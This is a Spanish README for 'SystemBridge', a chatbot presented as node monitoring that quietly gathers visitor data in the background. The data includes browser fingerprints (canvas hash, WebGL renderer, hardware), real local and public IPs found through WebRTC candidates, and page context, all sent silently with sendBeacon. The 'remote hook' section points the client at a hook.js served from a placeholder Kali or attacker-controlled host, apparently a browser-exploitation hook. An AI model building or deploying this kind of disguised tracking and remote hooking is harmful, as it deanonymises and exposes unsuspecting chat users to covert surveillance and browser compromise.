# SystemBridge: Monitoreo de Nodos Universal

SystemBridge es una plataforma de chatbot + telemetría pasiva en segundo plano para observabilidad técnica de nodos web.

## Arquitectura
- `server.js`: API REST, Socket.io y persistencia en MongoDB.
- `public/index.html`: cliente del chatbot.
- `public/src/app-core.js`: chat, fingerprint, diagnóstico WebRTC y envío de telemetría.
- `public/src/styles.css`: UI minimalista responsive optimizada para render fluido.
- `public/hook.js`: hook externo para integración con consola de gestión remota.

## Telemetría de Nodo (colección `netrunner`)
Cada perfil guarda el mismo nivel de detalle para todos los usuarios:
- Identidad: `nodeId`, `sessionId`, `source`, `userAgent`, `acceptedLanguage`.
- Red observada: `serverObservedIp`, `headerIp`.
- `profileCategory`: `Mobile | Tablet | Desktop` (clasificación automática por User-Agent + resolución).
- Fingerprint técnico: `hardwareConcurrency`, `deviceMemory`, `webglRenderer`, `canvasHash`, `stableFingerprint`.
- Diagnóstico WebRTC: `localIps`, `publicIps`, `candidateIps`, `srflxIps`, `localDescription`, `sdpCandidates`.
- Estado hook: `loaded`, `endpoint`, `status`, `detail`.
- Contexto de página: URL, visibilidad, timezone, viewport y resolución.

## Hook remoto
Configurar en `public/src/config.js`:
- `MONITOR_HOOK_URL`: `http://[TU_IP_KALI_O_DOMINIO]:3000/hook.js`
- `ASSET_MGMT_ENDPOINT`: endpoint remoto de gestión de activos.

## Seguridad operativa
- `.env` y logs locales están excluidos del versionado vía `.gitignore`.
- El cliente usa envío silencioso (`sendBeacon`/`keepalive`) en cierres y cambios de ruta para reducir pérdida de telemetría.

## Ejecución
```bash
npm install
npm start
```

Abrir `http://localhost:3000`.
